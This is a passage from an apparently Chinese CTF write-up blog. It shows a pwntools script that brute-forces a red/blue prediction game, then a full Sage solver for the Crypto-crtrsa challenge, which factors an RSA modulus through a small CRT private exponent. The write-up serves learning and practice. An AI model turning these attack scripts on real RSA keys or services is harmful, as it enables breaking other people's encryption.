class="string">&quot;r&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># Game x</span></span><br><span class="line">        p.recvline()  <span class="comment"># choose one [r] Red Team,[b] Blue Team:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> result.find(<span class="string">&quot;wrong&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="comment"># print(&quot;retry..&quot;)</span></span><br><span class="line">        s += <span class="string">&quot;b&quot;</span></span><br><span class="line">        p.sendline(<span class="built_in">bytes</span>(<span class="string">&quot;y&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># Play again? (y/n):Game 1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">        <span class="comment"># repeat</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="comment"># print(p.recvline().decode(),end=&quot;&quot;)# Game x</span></span><br><span class="line">            p.recvline()</span><br><span class="line">            <span class="comment"># print(p.recvline().decode(),end=&quot;&quot;)# choose one [r] Red Team,[b] Blue Team:</span></span><br><span class="line">            p.sendline(<span class="built_in">bytes</span>(s[i], encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            <span class="built_in">print</span>(s[i])</span><br><span class="line">            p.recvline()  <span class="comment"># Your choice xxx Team</span></span><br><span class="line">            p.recvline()  <span class="comment"># The result xxx Team</span></span><br><span class="line">            p.recvline()  <span class="comment"># win: The number of successful predictions xx</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># Game x</span></span><br><span class="line">        <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># choose one [r] Red Team,[b] Blue Team:</span></span><br></pre></td></tr></table></figure>

<h2 id="极客巅峰"><a href="#极客巅峰" class="headerlink" title="极客巅峰"></a>极客巅峰</h2><h3 id="Crypto-crtrsa"><a href="#Crypto-crtrsa" class="headerlink" title="Crypto-crtrsa"></a>Crypto-crtrsa</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flagn,p,q</span><br><span class="line"><span class="comment">#p and q are two primes generated by getPrime</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		dp = random.randint(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">20</span>)</span><br><span class="line">		dq = random.randint(<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> gcd(dp, p - <span class="number">1</span>) == <span class="number">1</span> <span class="keyword">and</span> gcd(dq, q - <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">			d = crt([dp,dq],[p-<span class="number">1</span>,q-<span class="number">1</span>])</span><br><span class="line">			phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">			R = Integers(phi)</span><br><span class="line">			e = R(d)^-<span class="number">1</span></span><br><span class="line">			<span class="keyword">return</span> p*q,e</span><br><span class="line">n,e = key_gen()</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(flagn,<span class="built_in">int</span>(e),n))</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">e = 2953544268002866703872076551930953722572317122777861299293407053391808199220655289235983088986372630141821049118015752017412642148934113723174855236142887</span><br><span class="line">N = 6006128121276172470274143101473619963750725942458450119252491144009018469845917986523007748831362674341219814935241703026024431390531323127620970750816983</span><br><span class="line">flag = 4082777468662493175049853412968913980472986215497247773911290709560282223053863513029985115855416847643274608394467813391117463817805000754191093158289399</span><br></pre></td></tr></table></figure>

<p>e很大，但是显然d也很大，所以那俩家伙都不行；从已知看，像dp泄漏，但e太大，枚举不了；最后看到<a href="https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/">一位师傅博客</a>上记录着RSA - Small CRT Private Exponents，可惜师傅没有给exp；然后也找到相关的论文，满大街都是，可惜看不懂；然后还是在github上找到了实现，就是来自密码狗狗手一个的RsaCtfTool中的一个工具small_crt_exp，贴下链接<a href="https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</a>，但是没太弄懂怎么使用命令行，直接拿源码了，拼凑下，完整的exp是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.libs.ntl.ntl_ZZ_pX <span class="keyword">import</span> ntl_ZZ_pContext, ntl_ZZ_pX</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(<span class="string">&quot;global_logger&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gmpy</span><br><span class="line"></span><br><span class="line">    gmpy_version = <span class="number">2</span></span><br><span class="line">    mpz = gmpy.mpz</span><br><span class="line">    logger.info(<span class="string">&quot;[+] Using gmpy version 2 for math.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> gmpy</span><br><span class="line"></span><br><span class="line">        gmpy_version = <span class="number">1</span></span><br><span class="line">        mpz = gmpy.mpz</span><br><span class="line">        logger.info(<span class="string">&quot;[+] Using gmpy version 1 for math.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        gmpy_version = <span class="number">0</span></span><br><span class="line">        mpz = <span class="built_in">int</span></span><br><span class="line">        gmpy = <span class="literal">None</span></span><br><span class="line">        logger.info(<span class="string">&quot;[+] Using python native functions for math.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpubkeysz</span>(<span class="params">n</span>):</span></span><br><span class="line">    size = <span class="built_in">int</span>(math.log2(n))</span><br><span class="line">    <span class="keyword">if</span> size &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">        size += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_gcdext</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [b, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d = b // a</span><br><span class="line">        r = b - (d * a)</span><br><span class="line">        g, y, x = _gcdext(r, a)</span><br><span class="line">        <span class="keyword">return</span> [g, x - d * y, y]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_isqrt</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    x, y = n, (n + <span class="number">1</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x, y = y, (y + n // y) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_introot</span>(<span class="params">n, r=<span class="number">2</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> r &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">else</span> -_introot(-n, r)</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> _isqrt(n)</span><br><span class="line">    lower, upper = <span class="number">0</span>, n</span><br><span class="line">    <span class="keyword">while</span> lower != upper - <span class="number">1</span>:</span><br><span class="line">        mid = (lower + upper) &gt;&gt; <span class="number">1</span></span><br><span class="line">        m = <span class="built_in">pow</span>(mid, r)</span><br><span class="line">        <span class="keyword">if</span> m == n:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> m &lt; n:</span><br><span class="line">            lower = mid</span><br><span class="line">        <span class="keyword">elif</span> m &gt; n:</span><br><span class="line">            upper = mid</span><br><span class="line">    <span class="keyword">return</span> lower</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_introot_gmpy</span>(<span class="params">n, r=<span class="number">2</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> r &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">else</span> -_introot_gmpy(-n, r)</span><br><span class="line">    <span class="keyword">return</span> gmpy.root(n, r)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_introot_gmpy2</span>(<span class="params">n, r=<span class="number">2</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> r &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">else</span> -_introot_gmpy2(-n, r)</span><br><span class="line">    <span class="keyword">return</span> gmpy.iroot(n, r)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_invmod</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    a, x, u = a % m, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a:</span><br><span class="line">        x, u, m, a = u, x - (m // a) * u, a, m % a</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_is_square</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = _isqrt(n)</span><br><span class="line">    <span class="keyword">return</span> i ** <span class="number">2</span> == n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin</span>(<span class="params">n, k=<span class="number">40</span></span>):</span></span><br><span class="line">    <span class="comment"># Taken from https://gist.github.com/Ayrx/5884790</span></span><br><span class="line">    <span class="comment"># Implementation uses the Miller-Rabin Primality Test</span></span><br><span class="line">    <span class="comment"># The optimal number of rounds for this test is 40</span></span><br><span class="line">    <span class="comment"># See http://stackoverflow.com/questions/6325576/how-many-iterations-of-rabin-miller-should-i-use-for-cryptographic-safe-primes</span></span><br><span class="line">    <span class="comment"># for justification</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If number is even, it&#x27;s a composite number</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    r, s = <span class="number">0</span>, n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        s &gt;&gt;= <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, k):</span><br><span class="line">        a = random.randrange(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        x = <span class="built_in">pow</span>(a, s, n)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> j &lt;= r - <span class="number">1</span>:</span><br><span class="line">            x = <span class="built_in">pow</span>(x, <span class="number">2</span>, n)</span><br><span class="line">            <span class="keyword">if</span> x == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_fermat_prime_criterion</span>(<span class="params">n, b=<span class="number">2</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Fermat&#x27;s prime criterion</span></span><br><span class="line"><span class="string">    Returns False if n is definitely composite, True if posible prime.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(b, n - <span class="number">1</span>, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_is_prime</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    If fermats prime criterion is false by short circuit we dont need to keep testing bases, so we return false for a guaranteed composite.</span></span><br><span class="line"><span class="string">    Otherwise we keep trying with primes 3 and 5 as base. The sweet spot is primes 2,3,5, it doesn&#x27;t improvee the runing time adding more primes to test as base.</span></span><br><span class="line"><span class="string">    If all the previus tests pass then we try with rabin miller.</span></span><br><span class="line"><span class="string">    All the tests are probabilistic.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        _fermat_prime_criterion(n)</span><br><span class="line">        <span class="keyword">and</span> _fermat_prime_criterion(n, b=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">and</span> _fermat_prime_criterion(n, b=<span class="number">5</span>)</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> miller_rabin(n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_next_prime</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> _is_prime(n):</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">erathostenes_sieve</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Returns  a list of primes &lt; n &quot;&quot;&quot;</span></span><br><span class="line">    sieve = [<span class="literal">True</span>] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, isqrt(n) + <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> sieve[i]:</span><br><span class="line">            sieve[<span class="built_in">pow</span>(i, <span class="number">2</span>) :: (i &lt;&lt; <span class="number">1</span>)] = [<span class="literal">False</span>] * (</span><br><span class="line">                (n - <span class="built_in">pow</span>(i, <span class="number">2</span>) - <span class="number">1</span>) // (i &lt;&lt; <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">            )</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">2</span>] + [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n, <span class="number">2</span>) <span class="keyword">if</span> sieve[i]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_primes = erathostenes_sieve</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_primes_yield</span>(<span class="params">n</span>):</span></span><br><span class="line">    p = i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        p = next_prime(p)</span><br><span class="line">        <span class="keyword">yield</span> p</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_primes_yield_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    p = i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        p = gmpy.next_prime(p)</span><br><span class="line">        <span class="keyword">yield</span> p</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_primes_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(_primes_yield_gmpy(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_invert</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a, b - <span class="number">2</span>, b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_lcm</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (x * y) // _gcd(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog2_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gmpy.log2(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gmpy.log(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog2_math</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(math.log2(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog_math</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(math.log(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog10_math</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(math.log10(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog10_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gmpy.log10(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_mod</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a % b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> gmpy_version &gt; <span class="number">0</span>:</span><br><span class="line">    gcd = gmpy.gcd</span><br><span class="line">    invmod = gmpy.invert</span><br><span class="line">    gcdext = gmpy.gcdext</span><br><span class="line">    is_square = gmpy.is_square</span><br><span class="line">    next_prime = gmpy.next_prime</span><br><span class="line">    is_prime = gmpy.is_prime</span><br><span class="line">    fib = gmpy.fib</span><br><span class="line">    primes = _primes_gmpy</span><br><span class="line">    lcm = gmpy.lcm</span><br><span class="line">    invert = gmpy.invert</span><br><span class="line">    powmod = gmpy.powmod</span><br><span class="line">    ilog = _ilog_gmpy</span><br><span class="line">    ilog2 = _ilog2_gmpy</span><br><span class="line">    mod = gmpy.f_mod</span><br><span class="line">    log = gmpy.log</span><br><span class="line">    log2 = gmpy.log2</span><br><span class="line">    log10 = gmpy.log10</span><br><span class="line">    ilog10 = _ilog10_gmpy</span><br><span class="line">    <span class="keyword">if</span> gmpy_version == <span class="number">2</span>:</span><br><span class="line">        isqrt = gmpy.isqrt</span><br><span class="line">        introot = _introot_gmpy2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        isqrt = gmpy.sqrt</span><br><span class="line">        introot = _introot_gmpy</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gcd = _gcd</span><br><span class="line">    isqrt = _isqrt</span><br><span class="line">    introot = _introot</span><br><span class="line">    invmod = _invmod</span><br><span class="line">    gcdext = _gcdext</span><br><span class="line">    is_square = _is_square</span><br><span class="line">    next_prime = _next_prime</span><br><span class="line">    fib = _fib</span><br><span class="line">    primes = erathostenes_sieve</span><br><span class="line">    is_prime = _is_prime</span><br><span class="line">    fib = _fib</span><br><span class="line">    primes = _primes</span><br><span class="line">    lcm = _lcm</span><br><span class="line">    invert = _invmod</span><br><span class="line">    powmod = <span class="built_in">pow</span></span><br><span class="line">    ilog = _ilog_math</span><br><span class="line">    ilog2 = _ilog2_math</span><br><span class="line">    mod = _mod</span><br><span class="line">    log = math.log</span><br><span class="line">    log2 = math.log2</span><br><span class="line">    log10 = math.log10</span><br><span class="line">    ilog10 = _ilog10_math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trivial_factorization_with_n_phi</span>(<span class="params">N, phi</span>):</span></span><br><span class="line">    m = N - phi + <span class="number">1</span></span><br><span class="line">    i = isqrt(<span class="built_in">pow</span>(m, <span class="number">2</span>) - (N &lt;&lt; <span class="number">2</span>))  <span class="comment"># same as isqrt((m**2) - (4*n))</span></span><br><span class="line">    roots = <span class="built_in">int</span>((m - i) &gt;&gt; <span class="number">1</span>), <span class="built_in">int</span>((m + i) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> roots[<span class="number">0</span>] * roots[<span class="number">1</span>] == N:</span><br><span class="line">        <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__all__ = [</span><br><span class="line">    getpubkeysz,</span><br><span class="line">    gcd,</span><br><span class="line">    isqrt,</span><br><span class="line">    introot,</span><br><span class="line">    invmod,</span><br><span class="line">    gcdext,</span><br><span class="line">    is_square,</span><br><span class="line">    next_prime,</span><br><span class="line">    is_prime,</span><br><span class="line">    fib,</span><br><span class="line">    primes,</span><br><span class="line">    lcm,</span><br><span class="line">    invert,</span><br><span class="line">    powmod,</span><br><span class="line">    ilog2,</span><br><span class="line">    ilog,</span><br><span class="line">    ilog10,</span><br><span class="line">    mod,</span><br><span class="line">    log,</span><br><span class="line">    log2,</span><br><span class="line">    log10,</span><br><span class="line">    trivial_factorization_with_n_phi,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poly_fast_ntl</span>(<span class="params">ctx, f, xs</span>):</span></span><br><span class="line">    <span class="comment"># Fast multipoint evaulation from Modern Computer Algebra 3rd edition 10.1</span></span><br><span class="line">    n = <span class="built_in">len</span>(xs)</span><br><span class="line">    rems = [<span class="number">0</span>] * (<span class="number">4</span> * n)  <span class="comment"># segment tree max size</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build_tree</span>(<span class="params">i, l, r</span>):</span></span><br><span class="line">        <span class="keyword">if</span> l + <span class="number">1</span> == r:</span><br><span class="line">            x = xs[l] <span class="keyword">if</span> l &lt; <span class="built_in">len</span>(xs) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            rems[i] = ntl_ZZ_pX([-x, <span class="number">1</span>], ctx)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        build_tree(i * <span class="number">2</span>, l, mid)</span><br><span class="line">        build_tree(i * <span class="number">2</span> + <span class="number">1</span>, mid, r)</span><br><span class="line">        rems[i] = rems[i * <span class="number">2</span>] * rems[i * <span class="number">2</span> + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    build_tree(<span class="number">1</span>, <span class="number">0</span>, n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compute</span>(<span class="params">f, i, l, r</span>):</span></span><br><span class="line">        <span class="keyword">if</span> l + <span class="number">1</span> == r:</span><br><span class="line">            <span class="keyword">yield</span> f % rems[i]</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">from</span> compute(f % rems[<span class="number">2</span> * i], <span class="number">2</span> * i, l, mid)</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">from</span> compute(f % rems[<span class="number">2</span> * i + <span class="number">1</span>], <span class="number">2</span> * i + <span class="number">1</span>, mid, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>(<span class="keyword">lambda</span> r: Integer(r.<span class="built_in">list</span>()[<span class="number">0</span>]), compute(f, <span class="number">1</span>, <span class="number">0</span>, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor</span>(<span class="params">n, e, bound</span>):</span></span><br><span class="line">    <span class="comment"># https://mathoverflow.net/questions/120160/attack-on-crt-rsa</span></span><br><span class="line">    D = ceil(sqrt(bound))</span><br><span class="line">    ctx = ntl_ZZ_pContext(n)  <span class="comment"># NTL&#x27;s polynomial multiplication is much faster</span></span><br><span class="line">    x = randint(<span class="number">1</span>, n - <span class="number">1</span>)</span><br><span class="line">    xe = <span class="built_in">int</span>(powmod(x, e, n))</span><br><span class="line">    poly_factors = []</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, D):</span><br><span class="line">        poly_factors.append(ntl_ZZ_pX([-x, power_mod(xe, a, n)], ctx))</span><br><span class="line">    poly = product(poly_factors)</span><br><span class="line">    xed = <span class="built_in">int</span>(powmod(xe, D, n))</span><br><span class="line">    ys = [<span class="built_in">int</span>(powmod(xed, b, n)) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, D)]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> poly_fast_ntl(ctx, poly, ys):</span><br><span class="line">        p = gcd(t, n)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> p &lt; n:</span><br><span class="line">            <span class="keyword">return</span> p, n // p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    n = <span class="number">6006128121276172470274143101473619963750725942458450119252491144009018469845917986523007748831362674341219814935241703026024431390531323127620970750816983</span></span><br><span class="line">    e = <span class="number">2953544268002866703872076551930953722572317122777861299293407053391808199220655289235983088986372630141821049118015752017412642148934113723174855236142887</span></span><br><span class="line">    bound = <span class="number">2</span>**<span class="number">20</span>  <span class="comment"># upper bound of min(d_p, d_q)</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):  <span class="comment"># Retrying</span></span><br><span class="line">        r = factor(n, e, bound)</span><br><span class="line">        <span class="keyword">if</span> r <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            p, q = r</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">0</span>)  <span class="comment"># Prints 0 if failed</span></span><br></pre></td></tr></table></figure>

<p>用这个可以分解出p，后面的就不再赘述；做密码题的套路就是能知晓，能找源码</p>
